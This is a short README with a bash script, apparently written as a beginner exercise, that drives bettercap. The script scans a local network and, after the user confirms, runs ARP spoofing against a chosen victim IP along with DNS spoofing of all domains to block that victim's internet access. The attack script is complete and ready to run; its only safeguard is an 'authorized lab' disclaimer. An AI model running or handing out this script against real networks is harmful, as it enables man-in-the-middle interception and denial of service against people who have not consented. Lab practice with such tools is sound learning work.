# Bettercap-Script
A beginner script made to learn the functionalities of bettercap using bash.

## What it does
- Asks for network interface (example: eth0)
- Asks for victim IP address
- Scans the network and shows devices
- Optionally blocks victim internet using ARP and DNS spoofing

## Requirements
- Kali Linux
- Bettercap
- Two VMs on the same network
- Authorized lab environment only

## Usage
Make executable:
chmod +x bettercap_lab.sh

Run:
sudo ./bettercap_lab.sh

## Disclaimer
For educational use only.
Only use on networks you own or have permission to test.

-----------------------------------------------------------------------------

## Script:
if [ "$EUID" -ne 0 ]; then
  echo "Please run with sudo"
  exit
fi

read -p "Enter network interface (example: eth0 or wlan0): " IFACE
read -p "Enter victim IP address: " TARGET

CAPLET="/tmp/simple.cap"
cat > $CAPLET <<EOF
set net.interface $IFACE
net.recon on
net.probe on
sleep 10
net.show
set arp.spoof.targets $TARGET
EOF

read -p "Block victim internet? Type yes to continue: " ANSWER
if [ "$ANSWER" = "yes" ]; then
cat >> $CAPLET <<EOF
arp.spoof on
set dns.spoof.domains *
dns.spoof on
EOF
fi

bettercap -iface $IFACE -caplet $CAPLET

